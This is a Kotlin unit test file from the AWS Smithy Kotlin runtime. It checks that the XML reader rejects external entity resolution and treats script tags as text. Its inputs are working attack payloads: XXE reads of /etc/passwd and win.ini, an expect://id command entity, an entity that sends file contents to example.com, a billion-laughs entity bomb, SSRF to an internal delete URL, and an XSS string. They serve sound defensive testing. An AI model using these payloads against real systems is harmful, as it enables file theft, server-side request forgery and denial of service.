/*
 * Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 * SPDX-License-Identifier: Apache-2.0.
 */
package aws.smithy.kotlin.runtime.serde.xml

import aws.smithy.kotlin.runtime.testing.runSuspendTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFails

class XmlEntityTest {

    @Test
    fun itDoesNotResolveEntities() = runSuspendTest {
        val inputs = listOf(
            """
                <!DOCTYPE updateProfile [            
                    <!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
    
                <updateProfile>
                    <firstname>Joe</firstname>
                    <lastname>&file;</lastname>
                </updateProfile>
            """,
            """
                <!DOCTYPE foo [
                   <!ELEMENT foo ANY >
                   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
                <foo>&xxe;</foo>
            """,
            """
                <!DOCTYPE foo
                  [<!ELEMENT foo ANY >
                   <!ENTITY xxe SYSTEM "expect://id" >]>
                <creds>
                  <user>`&xxe;`</user>
                  <pass>`mypass`</pass>
                </creds>
            """,
            """
                <!DOCTYPE updateProfile [
                <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
                <!ENTITY send SYSTEM 'http://example.com/?%file;'> ]>
                <updateProfile>
                <firstname>Joe</firstname>
                <lastname>&send;</lastname>
                </updateProfile>
            """,
            """
                <!DOCTYPE lolz [
                <!ENTITY lol "lol">
                <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
                <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
                <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
                <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
                <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
                ]>
                <lolz>&lol9;</lolz>
            """,
            """
                <!DOCTYPE updateProfile [
                <!ENTITY ssrf SYSTEM 'http://10.0.0.2/users.php?delete=all'> ]>
                <updateProfile>
                <firstname>Joe</firstname>
                <lastname>&ssrf;</lastname>
                </updateProfile>
            """,
            """
                <!DOCTYPE foo [
                  <!ELEMENT foo ANY >
                  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                <foo>&xxe;</foo>
            """
        ).map { it.encodeToByteArray() }

        inputs.forEach { xml ->
            assertFails {
                xmlStreamReader(xml).allTokens()
            }
        }
    }

    @Test
    fun itHandlesJSFunctionsAsStrings() = runSuspendTest {
        val input = """
            <script>alert('XSS')</script>
        """.encodeToByteArray()

        val actual = xmlStreamReader(input).allTokens()

        val expected = listOf(
            XmlToken.BeginElement(1, "script"),
            XmlToken.Text(1, "alert('XSS')"),
            XmlToken.EndElement(1, "script"),
        )
        assertEquals(expected, actual)
    }
}
